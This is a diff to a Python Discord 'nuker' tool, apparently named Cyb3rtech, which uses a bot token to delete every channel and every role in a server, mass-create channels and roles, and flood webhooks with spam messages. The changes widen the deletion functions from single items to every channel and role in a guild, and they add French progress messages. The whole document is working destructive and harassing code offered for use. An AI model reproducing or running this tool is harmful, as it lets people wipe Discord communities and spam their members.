@@ -59,6 +59,7 @@ def nuke(token):
     spam_message = input('\033[31mMessage to Spam >> \033[0m')
     new_name = input('\033[31mNew Server Name >> \033[0m')
     new_icon_url = input('\033[31mNew Server Icon URL >> \033[0m')
+    print(f"\033[31m[?]\033[0m Nuke en cours \033[31m[?]\033[0m")
 
     headers = {"Authorization": f"Bot {token}"}
 
@@ -71,21 +72,21 @@ def nuke(token):
     channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()
     for channel in channels:
         requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
-        time.sleep(0.1)  # Faster deletion
+        time.sleep(0.1)
 
     created_channels = []
     for i in range(channel_count):
         channel_data = {"name": "Cyb3rtech tool 💣", "type": 0}
         new_channel = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers, json=channel_data).json()
         created_channels.append(new_channel['id'])
-        time.sleep(0.1)  # Faster creation
+        time.sleep(0.1)
 
     webhooks = []
     for channel_id in created_channels:
         webhook_url = create_webhook(channel_id, headers)
         if webhook_url:
             webhooks.append(webhook_url)
-            time.sleep(1)  # Wait for webhook to be created
+            time.sleep(1)
 
     for webhook_url in webhooks:
         threading.Thread(target=spam_webhook, args=(webhook_url, spam_message)).start()
@@ -96,6 +97,7 @@ def nuke(token):
 def message_spam(token):
     guild_id = input('\033[31mGuild ID >> \033[0m')
     spam_message = input('\033[31mMessage to Spam >> \033[0m')
+    print(f"\033[31m[?]\033[0m Spam en cours \033[31m[?]\033[0m")
 
     headers = {"Authorization": f"Bot {token}"}
     channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()
@@ -106,6 +108,7 @@ def message_spam(token):
 def webhooks_spam(token):
     channel_id = input('\033[31mChannel ID >> \033[0m')
     spam_message = input('\033[31mMessage to Spam >> \033[0m')
+    print(f"\033[31m[?]\033[0m Webhooks Spam en cours \033[31m[?]\033[0m")
 
     headers = {"Authorization": f"Bot {token}"}
     webhook_url = create_webhook(channel_id, headers)
@@ -113,14 +116,19 @@ def webhooks_spam(token):
         threading.Thread(target=spam_webhook, args=(webhook_url, spam_message)).start()
 
 def delete_channel(token):
-    channel_id = input('\033[31mChannel ID >> \033[0m')
+    guild_id = input('\033[31mGuild ID >> \033[0m')
+    print(f"\033[31m[?]\033[0m Delete Channel en cours \033[31m[?]\033[0m")
     headers = {"Authorization": f"Bot {token}"}
-    requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
+    channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers).json()
+    for channel in channels:
+        requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
+        time.sleep(0.1)  # Faster deletion
 
 def create_channel(token):
     guild_id = input('\033[31mGuild ID >> \033[0m')
     channel_name = input('\033[31mChannel Name >> \033[0m')
     channel_count = int(input('\033[31mNumber of Channels to Create >> \033[0m'))
+    print(f"\033[31m[?]\033[0m Mass Channel en cours \033[31m[?]\033[0m")
 
     headers = {"Authorization": f"Bot {token}"}
     for _ in range(channel_count):
@@ -132,19 +140,25 @@ def create_role(token):
     guild_id = input('\033[31mGuild ID >> \033[0m')
     role_name = input('\033[31mRole Name >> \033[0m')
     role_count = int(input('\033[31mNumber of Roles to Create >> \033[0m'))
+    print(f"\033[31m[?]\033[0m Mass Role en cours \033[31m[?]\033[0m")
 
     headers = {"Authorization": f"Bot {token}"}
     for _ in range(role_count):
         role_data = {"name": role_name}
         requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers, json=role_data)
-        time.sleep(0.1)  # Faster creation
+        time.sleep(0.1)
 
 def delete_role(token):
     guild_id = input('\033[31mGuild ID >> \033[0m')
-    role_id = input('\033[31mRole ID >> \033[0m')
+    print(f"\033[31m[?]\033[0m Delete Role en cours \033[31m[?]\033[0m")
 
     headers = {"Authorization": f"Bot {token}"}
-    requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
+    roles = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/roles", headers=headers).json()
+
+    for role in roles:
+        if role['name'] != "@everyone":
+            requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role['id']}", headers=headers)
+            time.sleep(0.1)
 
 def main():
     while True:
@@ -156,30 +170,44 @@ def main():
                 os.system('python cyb3rtech.py')
                 break
             elif choice == 1:
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"\033[31m{menu}")
                 token = input('\033[31mToken >> \033[0m')
                 if is_bot_token_valid(token):
                     nuke(token)
             elif choice == 2:
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"\033[31m{menu}")
                 token = input('\033[31mToken >> \033[0m')
                 if is_bot_token_valid(token):
                     message_spam(token)
             elif choice == 3:
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"\033[31m{menu}")
                 token = input('\033[31mToken >> \033[0m')
                 if is_bot_token_valid(token):
                     webhooks_spam(token)
             elif choice == 4:
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"\033[31m{menu}")
                 token = input('\033[31mToken >> \033[0m')
                 if is_bot_token_valid(token):
                     delete_channel(token)
             elif choice == 5:
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"\033[31m{menu}")
                 token = input('\033[31mToken >> \033[0m')
                 if is_bot_token_valid(token):
                     create_channel(token)
             elif choice == 6:
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"\033[31m{menu}")
                 token = input('\033[31mToken >> \033[0m')
                 if is_bot_token_valid(token):
                     create_role(token)
             elif choice == 7:
+                os.system('cls' if os.name == 'nt' else 'clear')
+                print(f"\033[31m{menu}")
                 token = input('\033[31mToken >> \033[0m')
                 if is_bot_token_valid(token):
                     delete_role(token)
